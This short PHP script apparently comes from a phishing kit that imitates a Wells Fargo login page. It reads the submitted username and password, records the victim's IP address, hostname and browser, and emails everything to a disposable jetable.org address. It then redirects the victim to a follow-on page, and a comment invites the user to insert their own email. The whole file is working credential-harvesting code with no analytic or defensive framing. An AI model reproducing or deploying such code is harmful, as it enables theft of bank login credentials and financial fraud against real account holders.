<?

    $ip = getenv("REMOTE_ADDR");
	$message .= "-------------- WellsFargo login  -------------\n";
	$message .= "Username : ".$_POST['userid']."\n";
	$message .= "PassWord : ".$_POST['j_password']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$subject = "WellsFargo Login | $ip ";
	$send = "ioy95qexypfc5iq@jetable.org"; //Put You Email Here
	$headers = 'From: General' . "\r\n";
	mail($send,$subject,$message,$headers);
    echo "<meta http-equiv='refresh' content='0;URL=../logging.php?3948DM938S8337X72648Z987/'/>";
	?>